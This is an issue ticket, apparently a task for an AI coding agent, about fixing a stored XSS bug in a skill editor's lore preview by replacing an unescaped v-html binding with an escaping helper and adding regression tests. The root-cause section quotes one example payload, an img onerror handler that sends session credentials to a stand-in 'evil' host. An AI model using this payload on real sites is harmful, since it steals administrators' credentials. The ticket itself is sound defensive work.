# ISSUE-159: Fix stored XSS via unescaped `v-html` in the skill lore preview

**Status:** Resolved
**Type:** Bug
**Severity:** Critical (stored XSS in the authenticated admin console)

---

## Context & User Story

- **Goal:** As a server owner, I want opening a skill in the editor to never execute HTML/script embedded in a skill's lore text.
- **Agent Role:** You are an expert frontend security engineer executing this task.

## Implementation Requirements

- [x] Make `DisplaySection.renderedLore()` HTML-escape all non-color-code text (the safe `renderFormattedText` helper in `utils/minecraftColors.ts:64-76` already does this — use it)
- [x] Remove the `v-html="renderedLore(line)"` binding (line 171) in favor of the escaping implementation, per the `web/AGENTS.md` "No `v-html`" convention
- [x] Add a test asserting a lore line containing `<img onerror=...>` or `<script>` renders as escaped text, not executable HTML
- [x] Audit remaining `v-html` usages (`AbilitiesSection.vue:760`, `SkillTooltip.vue:9,16,19`) to confirm they all route through the escaping helper

## Technical Specifications & Context

- **Target Files:**
  - `web/frontend/src/components/skills/DisplaySection.vue:76-87,171`
  - `web/frontend/src/utils/minecraftColors.ts:64-76`
  - `web/frontend/src/components/skills/AbilitiesSection.vue:353-355,760`
  - `web/frontend/src/components/layout/SkillTooltip.vue:9,16,19`
- **Dependencies:** Skill YAML is end-user authored and can ship in skill packs; credentials live in `sessionStorage` (`api/client.ts:2`).
- **Constraints:** Do not break `&` color-code rendering. The safe helper must stay the single source of truth.

### Root Cause

`renderedLore()` only substitutes `&[0-9a-fk-or]` codes and passes all other text through verbatim. A skill lore line such as `<img src=x onerror="fetch('//evil/?c='+sessionStorage.skilling_credentials)">` renders as raw HTML the moment an admin opens the skill editor. The safe escaping implementation already exists in `utils/minecraftColors.ts`; `DisplaySection` reimplements it unsafely (duplicated logic drift).

### Proposed Fix

Replace `DisplaySection`'s lore rendering with `renderFormattedText` from `minecraftColors.ts` and drop the raw `v-html`. Add a regression test with a script-carrying lore line.

## Verification & Definition of Done

- [x] `cd web/frontend && npm run build` passes
- [x] Test: lore with `<img onerror=...>`/`<script>` renders as text (no element created)
- [x] Test: `&c`/`&l` color and format codes still render
- [x] Audit: every remaining `v-html` routes through the escaping helper or is removed
